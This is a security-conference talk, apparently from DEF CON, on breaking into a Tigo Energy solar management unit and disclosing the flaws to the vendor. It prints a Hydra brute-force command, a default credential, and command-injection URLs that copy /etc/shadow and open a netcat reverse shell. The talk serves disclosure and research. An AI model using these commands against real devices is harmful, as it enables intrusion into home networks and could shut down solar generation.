# All Your Solar Panels are Belong to Me

## Presenter: Fred Bret-Mounet

### Who Am I?
- **Disclaimer:**
  - This presentation is based on my personal research and may contain omissions and inaccuracies due to my own limitations.
  - The research was conducted in my spare time and is not affiliated with my employer.

### Introduction
- **Hacking Defined:**
  - "A hacker is one who enjoys the intellectual challenge of creatively overcoming limitations of software systems to achieve novel and clever outcomes." — Verna Gehring, *The Internet In Public Life* (2004)
- **Today's Topic:**
  - Tigo Energy® Maximizer™ Management Unit

### Tigo Energy® Maximizer™ Management Unit
- **Features:**
  - Remotely manages individual solar panels via Bluetooth.
  - Can remotely disable the array by shutting down individual solar panels in emergency conditions.
  - Reports performance data back to the cloud.
  - Can be used for performance Service Level Agreements (SLAs).

### Attack Surfaces
- **Logical:**
  - Open Access Point
  - HTTPd
  - DNS
  - SSH
  - Serial to TCP
  - DHCP
  - Unknown UDP 5002
- **Physical:**
  - uBoot
  - Console
  - RS-489
  - USB Host
  - Emergency Button

### Open Access Point
- **Discovery:**
  - Used [wigle.net](https://wigle.net/) to locate over 160 out of approximately 1000 devices with a 24/7 open access point.
  - Over 10,000 devices had limited windows of opportunity for an open access point.

### HTTPd
- **Initial Attempt:**
  - Initially, it seemed all was lost.
  - Used Hydra to attempt a brute force attack:
    ```bash
    hydra -l admin -P rockyou.txt -v http://192.168.1.10:80/
    ```
- **Success:**
  - After 36 hours, gained access with credentials: `Admin/Support`
  - Discovered a page that allowed copying files:
    ```bash
    http://192.168.1.2/cgi-bin/network?host=TIGO2; cp /etc/shadow /mnt/ffs/var/lmudcd.foreign_lmus
    ```

- **Further Exploitation:**
  - Abandoned brute-forcing and used NetCat to gain a shell:
    ```bash
    http://192.168.1.129/cgi-bin/network?host=TIGO2;nc -e /bin/sh 192.168.1.135 9999
    ```
  - Process list revealed:
    ```bash
    17406 root       0:00 httpd -h /mnt/ffs/www -c /mnt/ffs/etc/httpd.conf -r TigoEnergy Management Unit
    ```
  - Added a new user after some mount kung fu.

### Next Steps
- **Observations:**
  - Noticed a running process:
    ```bash
    3260 root       0:02 openvpn --config supporttcp.conf --syslog
    ```
  - The device had a permanent VPN tunnel back to the vendor, not mentioned in any documentation.

### Vendor Response
- **Communication:**
  - Sent multiple emails asking for patience.
  - Finally received a response:
    - Recognized the attached picture.
    - SLA took about 2 months.
- **Immediate Actions:**
  - Within an hour:
    - Open AP shut down
    - User removed
    - HTTPd shut down
- **Additional Information:**
  - Had a developer build part of about ~1000 units that were accidentally shipped.
  - No VPN backdoor confirmed.
  - Window of opportunity for open AP dramatically narrowed.

### What the Vendor Did Well
- **Positive Aspects:**
  - Welcomed my research once communication channels were open.
  - Custom uBoot build with password protection.
  - Unique OpenVPN key.
  - Log shipping.
  - Shipped replacement devices to all affected customers.

### Importance
- **Potential Risks:**
  - Could have shut down a large amount of solar generation.
  - Remote control of a network device on a home network.
  - Spying, botnet, anonymizer, etc.
  - Security is a critical issue for all IoT manufacturers.

### Takeaways
- **Lessons Learned:**
  - Segmented and firewalled my IoT devices.
  - Do not reach out to the vendor too soon.
  - Responsible disclosure is challenging but necessary.

### Credits
- **Acknowledgments:**
  - My wonderful wife for her unwavering support.
  - My son, Raphael, for his interest in my work.
  - Maxym at Tigo for his support.
  - Tigo for not suing me.
  - Defcon team for their invaluable support.
  - Paul, friends, and colleagues for their review and guidance.